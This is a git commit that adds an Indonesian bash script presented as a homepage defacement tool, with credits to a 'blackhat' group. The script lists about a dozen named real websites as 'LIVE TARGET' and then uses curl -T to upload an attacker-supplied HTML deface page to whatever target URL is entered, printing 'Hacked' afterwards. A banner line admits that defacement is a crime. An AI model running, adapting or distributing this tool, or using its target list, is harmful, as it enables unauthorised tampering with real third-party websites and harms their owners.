091c7a52fb4cff3baae6fce37508a0e116969a81
amenakun <50862294+amenakun@users.noreply.github.com>
2019-06-15 11:10:52 +0700

    Add files via upload
    TOOLS DEFACE TEBAS FULL HOMEPAGE

---
+++ q.sh
@@ -0,0 +1,56 @@
+#GILACODING
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+clear
+echo $green
+echo "LOADING..........................................................."
+sleep 0.5;
+echo $white
+echo "LAGI BERAK MOHON DITUNGGU SEBENTAR..................................................................................................................................................................................................................................................................................................................."
+sleep 0.8;
+clear
+figlet -f smslant "DEFACER AREA" | lolcat
+echo "------------------------------------------------------------------" | lolcat
+echo $red
+echo "WARNING!!$green kami tdk bertanggung jawab atas tindakan yg kalian lakukan karna deface adalah suatu tindak kriminal!!"
+echo
+echo $white"  ╔═════════════════════════ ▓▓ ࿇ ▓▓ ═════════════════════════╗ "
+echo
+echo $cyan"                    CREATED BY : $yellow AMENA GANS"
+echo $cyan"             SPESIAL THANKS TO : $yellow Micin | MR.P1K4CHU |
+                MH.REGA | Xsans | MR.51MB4H | 
+                      Jr.Fake404 | Legend |"
+echo $cyan"             Dan seluruh member FCM & PASURUAN BLACKHAT"
+echo $white"  ╚═════════════════════════ ▓▓ ࿇ ▓▓ ═════════════════════════╝"
+echo
+echo
+echo $cyan"       LIVE TARGET:"
+echo "http://contsol.co.za                                                  http://colourfactory.co.za
+ http://chillibitez.co.za                                              http://chasingfantasia.com
+ http://centraltech.co.za                                              http://cblandscapes.co.za
+ http://crimsonmonkeyweb.com
+ http://kevinbutho.com
+ http://prorepafrica.com
+ http://xposurephotography.co.za
+ http://windmillsandporcupines.co.za
+ http://tcnig.co.za
+ http://techdirect.co.za
+ http://thehellenic.co.za
+ http://valdicare.co.za
+ http://chasingfantasia.com
+ " | lolcat
+echo
+echo $green"SIMPAN SCRIPT DEFACE DILUAR FOLDER DAN BERFORMAT HTML"
+echo
+echo $cyan"╭─HAJAR TARGET"
+read -p "╰─$" target
+echo
+echo $yellow"╭─MASUKKAN SCRIPT DEFACE MU"
+read -p "╰─$ " script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$yellow"Hacked"$red"]"$cyan"===＞"$green" $target"
